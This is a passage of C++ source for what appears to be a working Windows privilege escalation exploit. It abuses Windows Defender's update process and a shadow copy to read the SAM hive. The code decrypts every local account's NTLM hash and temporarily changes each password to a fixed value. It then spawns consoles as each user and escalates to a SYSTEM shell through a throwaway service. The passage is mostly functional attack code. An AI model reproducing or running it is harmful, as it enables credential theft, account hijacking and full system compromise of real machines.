	POLICY_ACCOUNT_DOMAIN_INFO* domaininfo = 0;
	stat = LsaQueryInformationPolicy(hlsa, PolicyAccountDomainInformation, (PVOID*)&domaininfo);
	if (stat)
	{
		LOG_NT("ACCESS", stat, "LsaQueryInformationPolicy failed");
		return false;
	}
	LOG_OK("SAM", "Domain info obtained: %ws", domaininfo->DomainName.Buffer);
	/*wchar_t* stringsid = 0;
	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
	{
		printf("Failed to get string sid, error : %d\n", GetLastError());
		return false;
	}
	printf("Machine SID : %ws\n", stringsid);*/
	LOG_INFO("SAM", "Looking up username: %ws", username);
	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
	LSA_TRANSLATED_SID* lsatrans = 0;
	LSA_UNICODE_STRING lsaunistr = { 0 };
	RtlInitUnicodeString((PUNICODE_STRING)&lsaunistr, username);
	stat = LsaLookupNames(hlsa, 1, &lsaunistr, &lsareflist, &lsatrans);
	if (stat)
	{
		LOG_NT("ACCESS", stat, "LsaLookupNames failed for user %ws", username);
		return false;
	}
	LOG_OK("SAM", "User %ws resolved, RID=%d", username, lsatrans->RelativeId);
	LsaClose(hlsa);
	
	LOG_INFO("SAM", "Opening domain...");
	HANDLE hdomain = NULL;
	stat = _SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
	if (stat)
	{
		LOG_NT("ACCESS", stat, "SamOpenDomain failed");
		return false;
	}
	LOG_OK("SAM", "Domain opened, handle=0x%p", (void*)hdomain);

	LOG_INFO("SAM", "Opening user RID=%d...", lsatrans->RelativeId);
	HANDLE huser = NULL;
	stat = _SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
	if (stat)
	{
		LOG_NT("ACCESS", stat, "SamOpenUser failed for RID=%d", lsatrans->RelativeId);
		return false;
	}
	LOG_OK("SAM", "User opened, handle=0x%p", (void*)huser);

	//char password[] = "testp";
	//char* oldNTLM = CalculateNTLMHash((char*)"testp");
	char* oldNTLM = (char*)nthash;
	char* newNTLM = newNTLMHash ? newNTLMHash : CalculateNTLMHash(newpassword);

	char oldLm[16] = { 0 };
	char newLm[16] = { 0 };
	LOG_INFO("SAM", "Calling SamiChangePasswordUser for user %ws...", username);
	stat = _SamiChangePasswordUser(huser, false, (BYTE*)oldLm, (BYTE*)newLm, true, (BYTE*)oldNTLM, (BYTE*)newNTLM);

	if (stat)
	{
		LOG_NT("ACCESS", stat, "SamiChangePasswordUser failed for %ws", username);
		return false;
	}
	LOG_OK("SAM", "Password changed successfully for %ws", username);
	_SamCloseHandle(huser);
	_SamCloseHandle(hdomain);
	_SamCloseHandle(hsrv);
	/*
	if (newpassword) {
		printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
	}
	else {
		printf("Info : user \"%ws\" password has been changed back to older password\n", username);
	}
	*/
	return true;
}
//////////////////////////////////////////////////////////////////////
// SAM handling end
/////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////
// Exploit shell spawn start
/////////////////////////////////////////////////////////////////////
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		LOG_ERR("PRIV", "LookupPrivilegeValue(%ws) failed", lpszPrivilege);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		0,
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		LOG_ERR("PRIV", "AdjustTokenPrivileges(%ws) failed", lpszPrivilege);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		LOG_WARN("PRIV", "AdjustTokenPrivileges(%ws): privilege not assigned (token lacks it)", lpszPrivilege);
		return FALSE;
	}
	LOG_OK("PRIV", "%ws privilege %s on token=0x%p", lpszPrivilege, bEnablePrivilege ? "enabled" : "disabled", (void*)hToken);

	return TRUE;
}


bool DoSpawnShellAsAllUsers(HANDLE samfile)
{
	//SSL_library_init();
	//SSL_load_error_strings();
	char newpassword[] = "$PWNed666!!!WDFAIL";
	wchar_t newpassword_unistr[] = L"$PWNed666!!!WDFAIL";
	char* newNTLM = CalculateNTLMHash(newpassword);
	bool isadmin = false;
	char* retval = 0;
	ORHKEY hSAMhive = NULL;
	ORHKEY hSYSTEMhive = NULL;
	LOG_INFO("OFFREG", "Opening SAM hive via OROpenHiveByHandle...");
	DWORD err = OROpenHiveByHandle(samfile, &hSAMhive);

	bool systemshelllaunched = false;
	if (err)
	{
		char eb[512]; WinErrToStr(err, eb, sizeof(eb));
		LOG("[ERROR][OFFREG] OROpenHiveByHandle failed: error=%d (0x%08X) \"%s\"\n", err, err, eb);
		return false;
	}
	LOG_OK("OFFREG", "SAM hive opened, handle=0x%p", (void*)hSAMhive);

	unsigned char lsakey[16] = { 0 };

	LOG_INFO("OFFREG", "Extracting LSA boot key from registry...");
	if (!GetLSASecretKey(lsakey))
	{
		LOG_ERR("ACCESS", "GetLSASecretKey failed - cannot read HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa subkeys (JD/Skew1/GBG/Data). Need KEY_READ access.");
		return false;
	}
	LOG_OK("OFFREG", "Boot key extracted successfully");


	ORHKEY hkey = NULL;
	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account", &hkey);

	DWORD valuesz = 0;
	err = ORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
	if (err)
	{
		char eb[512]; WinErrToStr(err, eb, sizeof(eb));
		LOG("[ERROR][OFFREG] ORGetValue(F, size) failed: error=%d \"%s\"\n", err, eb);
		return false;
	}
	char* samkey = (char*)malloc(valuesz);
	err = ORGetValue(hkey, NULL, L"F", NULL, samkey, &valuesz);
	if (err)
	{
		char eb[512]; WinErrToStr(err, eb, sizeof(eb));
		LOG("[ERROR][OFFREG] ORGetValue(F, data) failed: error=%d \"%s\"\n", err, eb);
		return false;
	}
	LOG_OK("OFFREG", "SAM Account F value read (%d bytes)", valuesz);

	ORCloseKey(hkey);

	///////////////////////////////////////////////////////////
	int passwordEncryptionKeysz = 0;
	char* passwordEncryptionKey = (char*)UnprotectPasswordEncryptionKey(samkey, lsakey, &passwordEncryptionKeysz);

	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
	if (err)
	{
		char eb[512]; WinErrToStr(err, eb, sizeof(eb));
		LOG("[ERROR][OFFREG] OROpenKey(Users) failed: error=%d \"%s\"\n", err, eb);
		return false;
	}
	LOG_OK("OFFREG", "Opened SAM\\Domains\\Account\\Users");

	
	DWORD subkeys = NULL;
	err = ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (err)
	{
		char eb[512]; WinErrToStr(err, eb, sizeof(eb));
		LOG("[ERROR][OFFREG] ORQueryInfoKey failed: error=%d \"%s\"\n", err, eb);
		return false;
	}
	LOG_INFO("OFFREG", "Users subkey count: %d", subkeys);


	PwdEnc** pwdenclist = (PwdEnc**)malloc(sizeof(PwdEnc*) * subkeys);
	int numofentries = 0;
	for (int i = 0; i < subkeys; i++)
	{
		DWORD keynamesz = 0x100;
		wchar_t keyname[0x100] = { 0 };
		err = OREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL);
		if (err)
		{
			char eb[512]; WinErrToStr(err, eb, sizeof(eb));
			LOG("[ERROR][OFFREG] OREnumKey(%d) failed: error=%d \"%s\"\n", i, err, eb);
			return false;
		}
		if (_wcsicmp(keyname, L"users") == 0)
			continue;
		ORHKEY hkey2 = NULL;
		err = OROpenKey(hkey, keyname, &hkey2);
		if (err)
		{
			char eb[512]; WinErrToStr(err, eb, sizeof(eb));
			LOG("[ERROR][OFFREG] OROpenKey(%ws) failed: error=%d \"%s\"\n", keyname, err, eb);
			return false;
		}
		DWORD valuesz = 0;
		err = ORGetValue(hkey2, NULL, L"V", NULL, NULL, &valuesz);
		if (err == ERROR_FILE_NOT_FOUND)
			continue;
		if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) {
			char eb[512]; WinErrToStr(err, eb, sizeof(eb));
			LOG("[ERROR][OFFREG] ORGetValue(V, size) for %ws failed: error=%d \"%s\"\n", keyname, err, eb);
			return false;
		}
		PwdEnc* SAMpwd = (PwdEnc*)malloc(sizeof(PwdEnc));
		ZeroMemory(SAMpwd, sizeof(PwdEnc));
		SAMpwd->sz = valuesz;
		SAMpwd->buff = (char*)malloc(valuesz);
		ZeroMemory(SAMpwd->buff, valuesz);
		err = ORGetValue(hkey2, NULL, L"V", NULL, SAMpwd->buff, &valuesz);
		if (err)
		{
			char eb[512]; WinErrToStr(err, eb, sizeof(eb));
			LOG("[ERROR][OFFREG] ORGetValue(V, data) for %ws failed: error=%d \"%s\"\n", keyname, err, eb);
			return false;
		}
		SAMpwd->rid = wcstoul(keyname, NULL, 16);

		ULONG* accnameoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_OFFSET];
		SAMpwd->username = (wchar_t*)RtlOffsetToPointer(SAMpwd->buff, *accnameoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* usernamesz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_LENGTH_OFFSET];
		SAMpwd->usernamesz = *usernamesz;

		ULONG* LMhashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_OFFSET];
		SAMpwd->LMHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *LMhashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* LMhashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_LENGTH_OFFSET];
		SAMpwd->LMHashLenght = *LMhashsz;

		ULONG* NTHashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_OFFSET];
		SAMpwd->NTHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *NTHashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		ULONG* NThashsz = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
		SAMpwd->NTHashLenght = *NThashsz;

		pwdenclist[i] = SAMpwd;
		numofentries++;
	}


	wchar_t currentusername[UNLEN + 1] = { 0 };
	DWORD usernamesz = sizeof(currentusername) / sizeof(wchar_t);
	if (!GetUserName(currentusername, &usernamesz))
	{
		LOG_ERR("SAM", "GetUserName failed");
		return false;
	}
	LOG_INFO("SAM", "Current user: %ws", currentusername);


	for (int i = 0; i < numofentries; i++)
	{
		PwdEnc* samentry = pwdenclist[i];
		int realNTLMHashsz = 0;
		char* realNTLMHash = (char*)UnprotectNTHash(passwordEncryptionKey, passwordEncryptionKeysz, samentry->NTHash, samentry->NTHashLenght, &realNTLMHashsz, samentry->rid);
		char* stringntlm = 0;
		char emptyrepresentation[] = "{NULL}";
		if (realNTLMHashsz)
		{
			stringntlm = (char*)HexToHexString((unsigned char*)realNTLMHash, realNTLMHashsz);
		}
		else
		{

			stringntlm = emptyrepresentation;
		}
		wchar_t username[UNLEN + 1] = { 0 };
		if (samentry->usernamesz <= sizeof(username))
		{
			memmove(username, samentry->username, samentry->usernamesz);
		}
		LOG_INFO("SAM", "══════════════════════════════════════════");
		LOG_INFO("SAM", "  User : %ws | RID : %d | NTLM : %s", username, samentry->rid, stringntlm);
		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
			LOG_WARN("SAM", "  Skip: NULL NTLM hash");
			continue;
		}
		if (_wcsicmp(username, currentusername) == 0)
		{
			LOG_INFO("SAM", "  Skip: current user");
			continue;
		}
		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
		{
			LOG_INFO("SAM", "  Skip: WDAGUtilityAccount");
			continue;
		}
		
			retval = realNTLMHash;

			if (ChangeUserPassword(username, realNTLMHash, NULL,newNTLM))
			{
				LOG_OK("SAM", "  Password changed for %ws", username);

				HANDLE htoken = NULL;
				PSID logonsid = 0;
				LOG_INFO("TOKEN", "LogonUserEx(INTERACTIVE) for %ws...", username);
				if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken, &logonsid, NULL, NULL, NULL))
				{
					LOG_ERR("ACCESS", "LogonUserEx(INTERACTIVE) failed for %ws", username);
				}
				if (!systemshelllaunched) {
					LOG_INFO("TOKEN", "Checking token elevation type...");
					TOKEN_ELEVATION_TYPE tokentype;
					DWORD retsz = 0;
					if (!GetTokenInformation(htoken, TokenElevationType, &tokentype, sizeof(tokentype), &retsz))
					{
						LOG_ERR("ACCESS", "GetTokenInformation(TokenElevationType) failed");
					}
					else {
						LOG_INFO("TOKEN", "TokenElevationType=%d (%s)", tokentype,
							tokentype == TokenElevationTypeDefault ? "Default" :
							tokentype == TokenElevationTypeFull ? "Full" :
							tokentype == TokenElevationTypeLimited ? "Limited" : "Unknown");
					}

					if (tokentype == TokenElevationTypeLimited)
					{
						LOG_INFO("TOKEN", "Token is limited, querying linked (elevated) token...");
						TOKEN_LINKED_TOKEN linkedtoken = { 0 };


						if (!GetTokenInformation(htoken, TokenLinkedToken, &linkedtoken, sizeof(TOKEN_LINKED_TOKEN), &retsz))
						{
							LOG_ERR("ACCESS", "GetTokenInformation(TokenLinkedToken) failed");
						}

						HANDLE hdup = linkedtoken.LinkedToken;

						DWORD sidsz = MAX_SID_SIZE;
						PSID administratorssid = malloc(sidsz);

						if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, administratorssid, &sidsz))
						{
							LOG_ERR("ACCESS", "CreateWellKnownSid(WinBuiltinAdministratorsSid) failed");
						}



						if (!CheckTokenMembership(hdup, administratorssid, (PBOOL)&isadmin))
						{
							LOG_ERR("ACCESS", "CheckTokenMembership failed");
						}
						LOG_INFO("TOKEN", "CheckTokenMembership(Administrators): %s", isadmin ? "TRUE" : "FALSE");
						free(administratorssid);

						CloseHandle(hdup);
					}

					if (isadmin)
					{
						LOG_OK("TOKEN", "User %ws is admin - escalating to SYSTEM", username);




						LOG_OK("TOKEN", "  IsAdmin: TRUE - %ws qualifies for SYSTEM shell escalation", username);
						HANDLE htoken2 = NULL;
						LOG_INFO("TOKEN", "LogonUserEx(BATCH) for %ws...", username);
						if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &htoken2, &logonsid, NULL, NULL, NULL))
						{
							LOG_ERR("ACCESS", "LogonUserEx(BATCH) failed for %ws", username);
						}
						//SetPrivilege(htoken2, SE_DEBUG_NAME, TRUE);
						const wchar_t sid_string[] = L"S-1-16-8192";
						TOKEN_MANDATORY_LABEL integrity;
						PSID  sid = NULL;
						ConvertStringSidToSidW(sid_string, &sid);
						ZeroMemory(&integrity, sizeof(integrity));
						integrity.Label.Attributes = SE_GROUP_INTEGRITY;
						integrity.Label.Sid = sid;
						LOG_INFO("TOKEN", "Setting medium integrity level on token...");
						if (SetTokenInformation(htoken2, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
							LOG_ERR("ACCESS", "SetTokenInformation(TokenIntegrityLevel) failed");
						}
						else {
							LOG_OK("TOKEN", "Integrity level set to Medium (S-1-16-8192)");
						}
						LocalFree(sid);
						//CloseHandle(htoken2);

						LOG_INFO("TOKEN", "ImpersonateLoggedOnUser...");
						ImpersonateLoggedOnUser(htoken2);


						LOG_INFO("SVC", "OpenSCManager(SC_MANAGER_CONNECT|SC_MANAGER_CREATE_SERVICE)...");
						SC_HANDLE hmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
						if (!hmgr)
						{
							LOG_ERR("ACCESS", "OpenSCManager failed - impersonated token may lack service control rights");
						}
						else {
							LOG_OK("SVC", "SCManager opened");
						}

						GUID uid = { 0 };
						RPC_WSTR wuid = { 0 };
						wchar_t* wuid2 = 0;

						UuidCreate(&uid);
						UuidToStringW(&uid, &wuid);
						wuid2 = (wchar_t*)wuid;

						wchar_t binpath[MAX_PATH] = { 0 };
						GetModuleFileName(GetModuleHandle(NULL), binpath, MAX_PATH);
						wchar_t servicecmd[MAX_PATH] = { 0 };
						DWORD currentsesid = 0;
						ProcessIdToSessionId(GetCurrentProcessId(), &currentsesid);
						wsprintf(servicecmd, L"\"%s\" %d", binpath, currentsesid);

						LOG_INFO("SVC", "Creating service: name=%ws, cmd=%ws", wuid2, servicecmd);
						SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicecmd, NULL, NULL, NULL, NULL, NULL);
						if (!hsvc)
						{
							LOG_ERR("ACCESS", "CreateService failed - access denied or SCM unavailable");
						}
						else {
							LOG_OK("SVC", "Service created successfully");
							LOG_OK("SVC", "SYSTEM shell will be launched via service: %ws", wuid2);
						}

						LOG_INFO("SVC", "Starting service...");
						if (!StartService(hsvc, NULL, NULL)) {
							LOG_ERR("SVC", "StartService failed");
						} else {
							LOG_OK("SVC", "Service started");
						}
						Sleep(100);
						DeleteService(hsvc);
						CloseServiceHandle(hsvc);
						CloseServiceHandle(hmgr);
						RevertToSelf();
						CloseHandle(htoken2);
						systemshelllaunched = true;
					}
					else {
						LOG_INFO("TOKEN", "  IsAdmin: FALSE (non-admin user)");
					}


				}

				STARTUPINFO si = { 0 };
				PROCESS_INFORMATION pi = { 0 };
				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\conhost.exe", NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
				{
					LOG_ERR("ACCESS", "  CreateProcessWithLogonW failed for %ws", username);
				}
				else {
					LOG_OK("SAM", "  Shell spawned for %ws (PID=%d)", username, pi.dwProcessId);
					if (pi.hProcess)
						CloseHandle(pi.hProcess);
					if (pi.hThread)
						CloseHandle(pi.hThread);
				}

				if (!ChangeUserPassword(username, newNTLM, NULL, realNTLMHash))
				{
					LOG_ERR("SAM", "  Password restore failed for %ws", username);
				}

				else {
					LOG_OK("SAM", "  Password restored for %ws", username);
				}
				CloseHandle(htoken);
			}
			
			// __debugbreak();


		
	}

	ORCloseHive(hSAMhive);
	LOG_INFO("SAM", "══════════════════════════════════════════");
	free(newNTLM);
	return true;



}

bool IsRunningAsLocalSystem()
{

	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
		LOG_ERR("TOKEN", "OpenProcessToken(TOKEN_QUERY) failed");
		return false;
	}
	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
	DWORD retsz = 0;
	bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
	CloseHandle(htoken);
	if (!res)
		return false;

	return IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
}

void LaunchConsoleInSessionId(DWORD sessionid)
{
	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
		return;
	
	SetPrivilege(htoken, SE_TCB_NAME, TRUE);
	SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
	SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
	SetPrivilege(htoken, SE_DEBUG_NAME, TRUE);

	HANDLE hnewtoken = NULL;
	bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
	CloseHandle(htoken);
	if (!res)
		return;
	
	res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
	if (!res)
	{
		CloseHandle(hnewtoken);
		return;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);

	CloseHandle(hnewtoken);

	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	return;

}


//////////////////////////////////////////////////////////////////////
// Exploit shell spawn end
/////////////////////////////////////////////////////////////////////

int wmain(int argc, wchar_t* argv[])
{

	
	if (IsRunningAsLocalSystem())
	{
		LOG_INFO("MAIN", "Running as NT AUTHORITY\\SYSTEM");
		if (argc == 2)
		{
			DWORD sessionid = _wtoi(argv[1]);
			if (sessionid) {
				LOG_INFO("MAIN", "Launching console in session %d", sessionid);
				LaunchConsoleInSessionId(sessionid);
			}
		}
		return 0;
	}

	DWORD _sesid = 0;
	ProcessIdToSessionId(GetCurrentProcessId(), &_sesid);
	const wchar_t* filestoleak[] = { {L"\\Windows\\System32\\Config\\SAM"}
	/*,{L"\\Windows\\System32\\Config\\SYSTEM"},{L"\\Windows\\System32\\Config\\SECURITY"}*/
	};
	wchar_t fullvsspath[MAX_PATH] = { 0 };
	HANDLE hreleaseready = NULL;
	wchar_t updtitle[0x200] = { 0 };
	wchar_t targetfile[MAX_PATH] = { 0 };
	wchar_t nttargetfile[MAX_PATH] = { 0 };
	HANDLE htransaction = NULL;
	wchar_t* filestodel[100] = { 0 };
	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	char data[0x1000] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(data);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	LARGE_INTEGER li = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t mpampath[MAX_PATH] = { 0 };
	HANDLE hmpap = NULL;
	void* exebuff = NULL;
	DWORD readsz = 0;
	HANDLE hmapping = NULL;
	void* mappedbuff = NULL;
	HRSRC hres = NULL;
	DWORD ressz = NULL;
	HGLOBAL cabbuff = NULL;
	wchar_t cabpath[MAX_PATH] = { 0 };
	wchar_t updatepath[MAX_PATH] = { 0 };
	HANDLE hcab = NULL;
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	char _updatepath[MAX_PATH] = { 0 };
	bool extractres = false;
	char buff[0x1000] = { 0 };
	DWORD retbytes = 0;
	DWORD tid = 0;
	HANDLE hthread = NULL;
	WDRPCWorkerThreadArgs threadargs = { 0 };
	HANDLE hcurrentthread = NULL;
	HANDLE hdir = NULL;
	wchar_t newdefupdatedirname[MAX_PATH] = { 0 };
	wchar_t updatelibpath[MAX_PATH] = { 0 };
	UNICODE_STRING unistrupdatelibpath = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hupdatefile = NULL;
	UNICODE_STRING objlinkname = { 0 };
	UNICODE_STRING objlinktarget = { 0 };
	NTSTATUS ntstat = 0;
	OVERLAPPED ovd = { 0 };
	DWORD transfersz = 0;
	wchar_t newname[MAX_PATH] = { 0 };
	DWORD renstructsz = 0;

	size_t targetsz = 0;
	size_t printnamesz = 0;
	size_t pathbuffersz = 0;
	size_t totalsz = 0;
	REPARSE_DATA_BUFFER* rdb = 0;
	DWORD cb = 0;
	OVERLAPPED ov = { 0 };
	bool ret = false;
	DWORD retsz = 0;
	HANDLE hleakedfile = NULL;
	HANDLE hobjlink = NULL;
	LARGE_INTEGER _filesz = { 0 };
	OVERLAPPED ovd2 = { 0 };
	DWORD __readsz = 0;
	void* leakedfilebuff = 0;
	bool filelocked = false;
	bool needcabcleanup = false;
	bool dirmoved = false;
	bool needupdatedircleanup = false;
	UpdateFiles* UpdateFilesList = NULL;
	UpdateFiles* UpdateFilesListCurrent = NULL;
	bool isvssready = false;
	bool criterr = false;
	HANDLE hobjworkdir = NULL;
	HANDLE hsymlink = NULL;
	wchar_t objdirpath[MAX_PATH] = { 0 };
	try {

		LOG_INFO("MAIN", "Checking for Windows Defender signature updates...");
		while (!CheckForWDUpdates(updtitle, &criterr)){

			if (criterr)
				goto cleanup;
			LOG_WARN("MAIN", "No WD updates found. Rechecking in 30 seconds...");
			Sleep(30000);

		}
		LOG_OK("MAIN", "Found update: %ws", updtitle);

		UpdateFilesList = GetUpdateFiles();
		if (!UpdateFilesList)
		{
			LOG_ERR("MAIN", "GetUpdateFiles returned NULL - download or extraction failed");
			goto cleanup;
		}
		LOG_OK("MAIN", "Update files ready");


		LOG_INFO("MAIN", "Creating VSS copy via WD oplock trick...");
		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
		if (!hreleaseready)
		{
			LOG_ERR("MAIN", "CreateEvent(hreleaseready) failed");
			goto cleanup;
		}
			

		isvssready = TriggerWDForVS(hreleaseready, fullvsspath);
		if (!isvssready)
			goto cleanup;
			
		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
		{
			ZeroMemory(objdirpath, sizeof(objdirpath));
			UpdateFilesListCurrent = UpdateFilesList;
			UuidCreate(&uid);
			UuidToStringW(&uid, &wuid);
			wuid2 = (wchar_t*)wuid;
			wcscpy(envstr, L"%TEMP%\\");
			wcscat(envstr, wuid2);

			{
				
				OBJECT_ATTRIBUTES ndirobjattr = { 0 };
				UNICODE_STRING objdirunistr = { 0 };
				

				wnsprintf(objdirpath, MAX_PATH, L"\\Sessions\\%d\\BaseNamedObjects\\%s", _sesid, wuid2);
				RtlInitUnicodeString(&objdirunistr, objdirpath);
				InitializeObjectAttributes(&ndirobjattr, &objdirunistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
				LOG_INFO("OBJMGR", "Creating object directory: %ws", objdirpath);
				ntstat = _NtCreateDirectoryObjectEx(&hobjworkdir, GENERIC_ALL, &ndirobjattr,NULL,NULL);
				if (ntstat)
				{
					LOG_NT("ACCESS", ntstat, "NtCreateDirectoryObjectEx failed for %ws", objdirpath);
					goto cleanup;
				}
				LOG_OK("OBJMGR", "Object directory created, handle=0x%p", (void*)hobjworkdir);
			}


			ExpandEnvironmentStrings(envstr, updatepath, MAX_PATH);
			needupdatedircleanup = CreateDirectory(updatepath, NULL);
			if (!needupdatedircleanup)
			{
				LOG_ERR("MAIN", "CreateDirectory(%ws) failed", updatepath);
				goto cleanup;
			}
			LOG_OK("MAIN", "Created update directory: %ws", updatepath);

			{
				UNICODE_STRING _unisrc = { 0 };
				RtlInitUnicodeString(&_unisrc, L"WDUpdateDirectory");
				OBJECT_ATTRIBUTES _smobjattr = { 0 };
				InitializeObjectAttributes(&_smobjattr, &_unisrc, OBJ_CASE_INSENSITIVE, hobjworkdir, NULL);
				UNICODE_STRING _unidest = { 0 };
				wchar_t unidest[MAX_PATH] = { 0 };
				wcscpy(unidest, L"\\??\\");
				wcscat(unidest, updatepath);
				RtlInitUnicodeString(&_unidest, unidest);
				LOG_INFO("OBJMGR", "Creating symlink WDUpdateDirectory -> %ws", unidest);
				ntstat = _NtCreateSymbolicLinkObject(&hsymlink, GENERIC_ALL, &_smobjattr, &_unidest);
				if (ntstat)
				{
					LOG_NT("ACCESS", ntstat, "NtCreateSymbolicLinkObject(WDUpdateDirectory) failed");
					goto cleanup;
				}
				LOG_OK("OBJMGR", "WDUpdateDirectory symlink created");
			}

			while (UpdateFilesListCurrent)
			{
				wchar_t filepath[MAX_PATH] = { 0 };
				wchar_t filename[MAX_PATH] = { 0 };
				wcscpy(filepath, updatepath);
				wcscat(filepath, L"\\");
				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, filename, MAX_PATH);
				wcscat(filepath, filename);

				HANDLE hupdate = CreateFile(filepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, NULL, NULL);

				if (!hupdate || hupdate == INVALID_HANDLE_VALUE)
				{
					LOG_ERR("MAIN", "CreateFile(%ws) failed for update file", filepath);
					goto cleanup;
				}
				UpdateFilesListCurrent->filecreated = true;
				DWORD writtenbytes = 0;
				if (!WriteFile(hupdate, UpdateFilesListCurrent->filebuff, UpdateFilesListCurrent->filesz, &writtenbytes, NULL))
				{
					LOG_ERR("MAIN", "WriteFile(%ws) failed", filepath);
					CloseHandle(hupdate);
					goto cleanup;
				}
				CloseHandle(hupdate);
				LOG_OK("MAIN", "Written update file: %ws (%d bytes)", filepath, writtenbytes);
				UpdateFilesListCurrent = UpdateFilesListCurrent->next;

			}

			LOG_INFO("MAIN", "Opening WD Definition Updates directory for monitoring...");
			hdir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
			if (!hdir || hdir == INVALID_HANDLE_VALUE)
			{
				LOG_ERR("ACCESS", "CreateFile(Definition Updates) failed - check permissions");
				goto cleanup;
			}
			LOG_OK("MAIN", "Definition Updates directory opened for monitoring");

			hcurrentthread = OpenThread(THREAD_ALL_ACCESS, NULL, GetCurrentThreadId());
			if (!hcurrentthread)
			{
